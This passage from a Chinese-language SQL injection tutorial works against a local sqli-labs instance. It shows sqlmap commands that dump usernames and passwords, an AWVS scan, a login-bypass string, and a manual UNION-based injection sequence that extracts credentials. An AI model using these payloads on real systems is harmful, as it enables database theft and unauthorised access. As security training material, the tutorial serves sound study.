&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x&#34;&gt;http://192.168.1.4:18888/sqli/Less-1/?id=1&lt;/span&gt; -D security --tables&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png&#34; alt=&#34;image-20220213183308240&#34;&gt;&lt;/p&gt;
&lt;p&gt;4.sqlmap -u URL -D database -T tables --columns 获得表中字段名&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x&#34;&gt;http://192.168.1.4:18888/sqli/Less-1/?id=1&lt;/span&gt; -D security -T users --columns&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png&#34; alt=&#34;image-20220213183454058&#34;&gt;&lt;/p&gt;
&lt;p&gt;5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x&#34;&gt;http://192.168.1.4:18888/sqli/Less-1/?id=1&lt;/span&gt; -D security -T users -C password,username --dump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png&#34; alt=&#34;image-20220213183651064&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;72对于post请求爆破方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#72对于post请求爆破方式&#34;&gt;#&lt;/a&gt; 7.2 对于 post 请求爆破方式&lt;/h4&gt;
&lt;p&gt;1. 保存文件方式  sqlmap -r x.txt&lt;/p&gt;
&lt;p&gt;先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt;  -r E:\1.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png&#34; alt=&#34;image-20220213183936861&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png&#34; alt=&#34;image-20220213184622656&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 手动输入 post 参数方式  sqlmap -u URL --data “”&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt;  -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=&#34;&gt;http://192.168.1.4:18888/sqli/Less-17/index.php&lt;/span&gt; --data “uname=admin&amp;amp;passwd=admin&amp;amp;submit=Submit” --current-db&lt;/p&gt;
&lt;p&gt;3. 自动搜索 post 参数方式&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt;  -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=&#34;&gt;http://192.168.1.4:18888/sqli/Less-17/index.php&lt;/span&gt; --forms&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png&#34; alt=&#34;image-20220213185639194&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;73对于一些较难注入的场景&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#73对于一些较难注入的场景&#34;&gt;#&lt;/a&gt; 7.3 对于一些较难注入的场景&lt;/h4&gt;
&lt;p&gt;通过指定 level 设置，一共包含五个等级&lt;/p&gt;
&lt;p&gt;level=2 http cookie 会测试&lt;/p&gt;
&lt;p&gt;level=3 http user-agent/referer 头会测试&lt;/p&gt;
&lt;p&gt;level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x&#34;&gt;http://192.168.1.4:18888/sqli/Less-1/?id=1&lt;/span&gt; level 5&lt;/p&gt;
&lt;h3 id=&#34;使用awvs-进行sql-inject扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用awvs-进行sql-inject扫描&#34;&gt;#&lt;/a&gt; 使用 AWVS 进行 sql inject 扫描&lt;/h3&gt;
&lt;p&gt;安装过程不在描述，使用 add target 输入要扫描的地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png&#34; alt=&#34;image-20220305141924499&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择扫描速度&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png&#34; alt=&#34;image-20220305142112656&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置 user-agent 伪装&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png&#34; alt=&#34;image-20220305142142802&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以联动被动扫描器如 xray 进行多次扫描，&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png&#34; alt=&#34;image-20220305142228843&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择 scan&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png&#34; alt=&#34;image-20220305142305286&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 sql 注入，存在盲注&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png&#34; alt=&#34;image-20220305142353893&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击可以查看详细信息和扫描过程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png&#34; alt=&#34;image-20220305142445896&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;3sql注入基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3sql注入基础&#34;&gt;#&lt;/a&gt; 3.SQL 注入基础&lt;/h3&gt;
&lt;h4 id=&#34;31sql前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31sql前置知识&#34;&gt;#&lt;/a&gt; 3.1SQL 前置知识&lt;/h4&gt;
&lt;p&gt;1.mysql 查询方式&lt;/p&gt;
&lt;p&gt;mysql 注入主要关注 MYSQL 系统数据库 &lt;code&gt;information_schema&lt;/code&gt; ，关注系统数据库的表 &lt;code&gt;columns&lt;/code&gt;  和 &lt;code&gt;schemata&lt;/code&gt;  表以及 &lt;code&gt;tables&lt;/code&gt;  表&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SCHEMATA&lt;/code&gt;  表：提供了关于数据库的信息&lt;/p&gt;
&lt;p&gt;desc information_schema.schemata;&lt;/p&gt;
&lt;p&gt;select distinct schema_name from schemata;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png&#34; alt=&#34;image-20220213191251636&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png&#34; alt=&#34;image-20220213191345456&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;COLUMNS&lt;/code&gt;  表：给出了表中的列信息&lt;/p&gt;
&lt;p&gt;desc information_schema.columns;&lt;/p&gt;
&lt;p&gt;select distinct column_name from information_schema.columns&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TABLES&lt;/code&gt;  表：给出了关于数据库中的表的信息&lt;/p&gt;
&lt;p&gt;desc information_schema.tables;&lt;/p&gt;
&lt;p&gt;select distinct table_name from information_schema.tables;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;即可以使用的查询语句为&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.select table_name from information_schema.tables where table_schema=&amp;#x27;security&amp;#x27;; 获取表名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.select column_name  from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; and table_schema=&amp;#x27;security&amp;#x27;;  获取列名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.select username from users;  获取数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.mysql 函数&lt;/p&gt;
&lt;p&gt;常用的 mysql 函数有：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user()&lt;/code&gt;  用户名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;database()&lt;/code&gt;  数据库名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;version()&lt;/code&gt;  mysql 数据库版本&lt;/p&gt;
&lt;p&gt;&lt;code&gt;load_file()&lt;/code&gt;  mysql 读取本地文件的函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;@@datadir&lt;/code&gt;   数据库路径&lt;/p&gt;
&lt;p&gt;3.sql 常用注释&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png&#34; alt=&#34;image-20220213193633629&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;32sql注入定义&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32sql注入定义&#34;&gt;#&lt;/a&gt; 3.2SQL 注入定义&lt;/h4&gt;
&lt;p&gt;SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。&lt;/p&gt;
&lt;p&gt;本质因为输入的数据和代码不进行区分&lt;/p&gt;
&lt;p&gt;成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。&lt;/p&gt;
&lt;p&gt;所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入&lt;/p&gt;
&lt;p&gt;常见的包括：&lt;/p&gt;
&lt;p&gt;Get 参数触发 SQL 注入&lt;/p&gt;
&lt;p&gt;POST 参数触发 SQL 注入&lt;/p&gt;
&lt;p&gt;Cookie 触发 SQL 注入&lt;/p&gt;
&lt;p&gt;其他参与 sql 执行的输入都有可能进行 SQL 注入&lt;/p&gt;
&lt;p&gt;两个条件&lt;/p&gt;
&lt;p&gt;用户能够控制输入&lt;/p&gt;
&lt;p&gt;原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据&lt;/p&gt;
&lt;h4 id=&#34;32mysql注入分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32mysql注入分类&#34;&gt;#&lt;/a&gt; 3.2mysql 注入分类&lt;/h4&gt;
&lt;p&gt;1. 按照请求方法注入&lt;/p&gt;
&lt;p&gt;​	get 型注入&lt;/p&gt;
&lt;p&gt;​	post 型注入&lt;/p&gt;
&lt;p&gt;2. 按照 SQL 数据类型分类&lt;/p&gt;
&lt;p&gt;​	整形注入&lt;/p&gt;
&lt;p&gt;​	字符型注入&lt;/p&gt;
&lt;p&gt;3. 其他类型数据类型&lt;/p&gt;
&lt;p&gt;​	报错注入&lt;/p&gt;
&lt;p&gt;​	双注入&lt;/p&gt;
&lt;p&gt;​	布尔盲注&lt;/p&gt;
&lt;p&gt;​	时间盲注&lt;/p&gt;
&lt;p&gt;​	Cookie 注入&lt;/p&gt;
&lt;p&gt;​	User-Agent 注入&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;手工注入过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1 判断是否存在注入点；&lt;/p&gt;
&lt;p&gt;2 判断字段长度（字段数）；&lt;/p&gt;
&lt;p&gt;3 判断字段回显位置；&lt;/p&gt;
&lt;p&gt;4 判断数据库信息；&lt;/p&gt;
&lt;p&gt;5 查找数据库名；&lt;/p&gt;
&lt;p&gt;6 查找数据库表；&lt;/p&gt;
&lt;p&gt;7 查找数据库表中所有字段以及字段值；&lt;/p&gt;
&lt;p&gt;8 猜解账号密码；&lt;/p&gt;
&lt;p&gt;9 登录管理员后台。&lt;/p&gt;
&lt;h5 id=&#34;万能密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#万能密码&#34;&gt;#&lt;/a&gt; 万能密码&lt;/h5&gt;
&lt;p&gt;select * from users where  username=&amp;quot;&amp;quot; or 1=1 --+&lt;/p&gt;
&lt;p&gt;通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;&lt;/p&gt;
&lt;h5 id=&#34;整形注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#整形注入&#34;&gt;#&lt;/a&gt; 整形注入&lt;/h5&gt;
&lt;p&gt;1. 判断是否由注入 (是否未严格校验)— 第一要素&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27;   报错说明是整形注入 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输入的SQL语句能否不报错，语句是否可以成功闭合&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;information_schema 包含当前数据库表名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tables 数据库中所有表，通过table_schema 和table_name 确定&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;因此需要判断前一个表有几列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果提示有different columns，说明不匹配，可以使用枚举&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这里的1,2,3只是用于占位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;寻找数据库名字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询当前数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询表有哪些字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&amp;#x27;users&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询用户名密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;以human_read输出user_name和password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&amp;#x27;:&amp;#x27;,username,password)),3 from security.users %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 什么类型注入&lt;/p&gt;
&lt;p&gt;3. 语句是否能够被恶意修改 — 第二要素&lt;/p&gt;
&lt;p&gt;4. 是否能够成功执行 — 第三要素&lt;/p&gt;
&lt;p&gt;5. 获取想要数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.判断是否是整形注入，即加&amp;#x27;判断是否可以闭合&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;order by 探测列名原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;字符型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#字符型注入&#34;&gt;#&lt;/a&gt; 字符型注入&lt;/h5&gt;
&lt;p&gt;和数字型区别：接收的参数是否有’’ ,id=&#39;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mtext&gt;字符型，&lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;id&amp;#x27;字符型，id=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.751892em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;字&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;符&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;型&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;id 数字型&lt;/p&gt;
&lt;p&gt;也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’&lt;/p&gt;
